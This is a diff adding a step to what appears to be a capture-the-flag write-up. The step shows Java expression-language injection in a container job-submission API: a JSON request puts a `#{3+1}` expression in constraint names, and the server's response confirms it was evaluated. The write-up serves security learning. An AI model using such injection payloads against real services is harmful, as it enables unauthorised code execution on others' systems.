@@ -392,6 +392,29 @@ This failed but gave me confirmation that we are hitting the right sink as I now
 ```
 {"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [${9*9}]', type: 'HARD''}, {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [${9*9}]', type: 'HARD''}"}
 ```
+After trying the most common Java EL injection vectors such as `${}`, we find one that gets our code interpreted!
+```
+{
+    "applicationName": "localtest",
+    "owner": {"teamEmail": "me@me.com"},
+    "container": {
+      "image": {"name": "alpine2", "tag": "latest"},
+      "entryPoint": ["/bin/sleep", "1h"],
+      "securityProfile": {"iamRole": "test-role", "securityGroups": ["sg-test"]},
+      "hardConstraints": {"constraints": {"CTF-AND-CHILL-#{3+1}":"a"}, "expression": ""},
+      "softConstraints": {"constraints": {"CTF-AND-CHILL-#{3+1}":"a"}, "expression": ""}
+      },
+    "batch": {
+      "size": 1,
+      "runtimeLimitSec": "3600",
+      "retryPolicy":{"delayed": {"delayMs": "1000", "retries": 3}}
+    }
+  }
+```
+`CTF-AND-CHILL-4` is there!
+```
+{"statusCode":400,"message":"Invalid Argument: {Validation failed: 'field: 'container', description: 'Soft and hard constraints not unique. Shared constraints: [CTF-AND-CHILL-4]', type: 'HARD''}, {Validation failed: 'field: 'container.softConstraints', description: 'Unrecognized constraints [ctf-and-chill-4]', type: 'HARD''}, {Validation failed: 'field: 'container.hardConstraints', description: 'Unrecognized constraints [ctf-and-chill-4]', type: 'HARD''}"}
+```
 ## Step 4.2:
 
 
